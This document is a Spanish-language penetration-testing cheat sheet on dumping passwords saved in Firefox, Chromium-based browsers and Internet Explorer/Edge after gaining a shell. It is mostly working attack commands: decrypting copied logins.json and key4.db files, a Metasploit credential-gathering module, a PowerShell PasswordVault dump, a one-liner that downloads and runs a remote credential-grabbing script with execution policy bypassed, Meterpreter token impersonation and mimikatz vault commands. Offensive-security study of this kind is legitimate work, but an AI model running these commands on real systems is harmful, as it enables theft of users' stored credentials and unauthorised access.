---
title: Browser Dump Credentials
published: true
---

# BROWSER DUMP CREDENTIALS

## Table of contents

- [BROWSER DUMP CREDENTIALS](#browser-dump-credentials)
  - [Volcado de contraseñas almacenadas de Mozilla Firefox](#volcado-de-contraseas-almacenadas-de-mozilla-firefox)
    - [firepwd](#firepwd)
    - [firefox decrypt](#firefox-decrypt)
    - [METASPLOIT](#metasploit)
    - [IMPORTAR PERFIL DESDE CONSOLA](#importar-perfil-desde-consola)
  - [Volcado de contraseñas almacenadas de Google Chrome - Opera - Brave](#volcado-de-contraseas-almacenadas-de-google-chrome---opera---brave)
    - [REQUISITOS](#requisitos)
    - [EXPLOTACION](#explotacion)
  - [Volcado de contraseñas almacenadas de Internet Explorer](#volcado-de-contraseas-almacenadas-de-internet-explorer)
    - [REQUISITOS](#requisitos)
    - [VOLCAR CON POWERSHELL](#volcar-con-powershell)
    - [VOLCAR DESDE SHELL NT AUTHORITY SYSTEM](#volcar-desde-shell-nt-authority-system)
  - [FUENTE](#fuente)

## Volcado de contraseñas almacenadas de Mozilla Firefox

Cómo funciona: según la versión, Firefox almacenará los nombres de usuario y las contraseñas en los siguientes archivos:

-   Firefox < 32 (key3.db, signons.sqlite)
-   Firefox >=32 (key3.db, inicios de sesión.json)
-   Firefox >=58.0.2 (key4.db, inicios de sesión.json)
-   Firefox >=75.0 (sha1 pbkdf2 sha256 aes256 cbc usado por key4.db, logins.json)

Tenga en cuenta que el archivo de clave almacena la clave de cifrado que se usa para cifrar los valores en los archivos sqlite/json. Este ataque en realidad se puede realizar sin conexión, siempre que tengamos los archivos que necesitamos.

El administrador de contraseñas integrado de Mozilla Firefox almacena las credenciales cifradas en **"logins.json"**. Las credenciales se almacenan en **logins.json** y se cifran con una clave que se almacena en el archivo **"key4.db"**. 

Ambos archivos se encuentran en un determinado directorio de Windows.

```bash
%LocalAppData%\Mozilla\Firefox\Profiles\randomString.Default\logins.json	

#o 

%USERPROFILE%\appdata\roaming\mozilla\firefox\profiles\<RANDOMSTRING>.default
```

en linux podemos buscar con `find` desde la carpeta raiz `~`:

```bash
find . -type f -name logins*

#resultado

./.mozilla/firefox/k2laopy5.default-release/logins.json
./.mozilla/firefox/k2laopy5.default-release/logins-backup.json
./.mozilla/firefox/btjnapfh.default-release-2/logins.json
./.mozilla/firefox/btjnapfh.default-release-2/logins-backup.json
find: ‘./.gvfs’: Permission denied
```

**A VECES PUEDE ESTAR EN EL DIRECTORIO DEL USUARIO COMO .firefox (oculto)**

Copie todos los archivos de este directorio y paselos a su equipo Kali.

### firepwd

podemos usar la herramienta [firepwn](https://github.com/lclevy/firepwd) para descifrar los archivos una vez pasados a la maquina kali:

```bash
git clone https://github.com/lclevy/firepwd
cd firepwd  
pip3 install -r requirements.txt
```

```bash
python3 firepwd.py -v #si los archivos estan en el directorio actual

#el parametro -d pide obligatorio un "/" al final
python3 firepwd.py -v -d firefox_DB/ #en un directorio especifico
```

Tenga en cuenta que Firefox tiene la opción de establecer una contraseña maestra para proteger los inicios de sesión. Nunca he visto a alguien realmente usar esto. Sin embargo, si uno está en uso, debe especificarlo con la opción `-p`.

```bash
python3 firepwd.py -v -d firefox_DB/ -p password #en caso de tener password el archivo logins.json
```

### firefox decrypt

la herramienta [firefox_decrypt](https://github.com/Unode/firefox_decrypt) funciona similar al anterior:

```bash
git clone https://github.com/unode/firefox_decrypt.git
cd firefox_decrypt

python firefox_decrypt.py /path/firefox/db
```

### METASPLOIT

```bash
run post/multi/gather/firefox_creds
```

### IMPORTAR PERFIL DESDE CONSOLA

Firefox tiene una serie de comandos desde consola:

```bash
#iniciar firefox
firefox
/usr/bin/firefox

#abrir una nueva ventana
/usr/bin/firefox www.cyberciti.biz

#abrir un nuevo tab
/usr/bin/firefox --new-window http://www.cyberciti.biz/

#Puede buscar palabras (término) con su motor de búsqueda predeterminado
/usr/bin/firefox --search "term"  
/usr/bin/firefox -search "linux add user to group"

#abrir las preferencias de firefox
/usr/bin/firefox --preferences

### Establecer Firefox como navegador predeterminado
/usr/bin/firefox --setDefaultBrowser
```

si por ejemplo tenemos los datos de firefox (sha1 pbkdf2 sha256 aes256 cbc usado por key4.db, logins.json) podemos inportar el perfil con esos datos:

```bash
firefox --profile .firefox/b5w4643p.default-release
```

Para obtener información personal sobre este perfil, ingresé `about:logins` en la barra de direcciones del navegador. Alternativamente, el acceso es posible con un clic en el icono de perfil y "Inicios de sesión y contraseñas".

Allí encontré las credenciales del perfil.

- [https://marcorei7.wordpress.com/2021/05/12/133-glitch/](https://marcorei7.wordpress.com/2021/05/12/133-glitch/)

## Volcado de contraseñas almacenadas de Google Chrome - Opera - Brave

Chrome, Brave y Opera están construidos sobre Chromium, y todos funcionan bajo el capó más o menos de la misma manera. Como resultado, todos almacenan contraseñas más o menos iguales.

### REQUISITOS

-  un shell como el usuario del que desea robar las credenciales
- permisos NT Authority\\System
-   PowerShell y una copia de System.Data.Sqlite.dll
-   Mimikatz

### EXPLOTACION

- [https://kylemistele.medium.com/stealing-saved-browser-passwords-your-new-favorite-post-exploitation-technique-c5e72c86159a](https://kylemistele.medium.com/stealing-saved-browser-passwords-your-new-favorite-post-exploitation-technique-c5e72c86159a)


## Volcado de contraseñas almacenadas de Internet Explorer

Versiones antiguas de Edge usan la bóveda (Vault) de credenciales (como IE), las versiones mas nuevas de IE más nuevas las guardan en la nube en los servidores de Microsoft si ha iniciado sesión en una cuenta de Microsoft. Todavía vale la pena comprobarlo de cualquier manera.

### REQUISITOS

-  un shell como el usuario del que desea robar las credenciales
- permisos NT Authority\\System

### VOLCAR CON POWERSHELL

```bash
[void[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]

$vault = New-Object Windows.Security.Credentials.PasswordVault

$vault.RetrieveAll() | % { $_.RetrievePassword();$_ } | select username,resource,password
```

```bash
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/HanseSecure/credgrap_ie_edge/master/credgrap_ie_edge.ps1')"
```

### VOLCAR DESDE SHELL NT AUTHORITY SYSTEM

Tiene un par de opciones para este ataque si se ejecuta en un shell de alta integridad. Si está ejecutando Meterpreter, puede usar los siguientes comandos para hacerse pasar por un usuario:

```bash
load incognito  
list tokens -u  
impersonate_token <SOME_TOKEN>  
shell
```

mimikatz:

```bash
vault::cred  
vault::list



sekurlsa::minidump lsass.dmp # load the memory dump  
vault::cred  
vault::list
```

## FUENTE

- [https://kylemistele.medium.com/stealing-saved-browser-passwords-your-new-favorite-post-exploitation-technique-c5e72c86159a](https://kylemistele.medium.com/stealing-saved-browser-passwords-your-new-favorite-post-exploitation-technique-c5e72c86159a)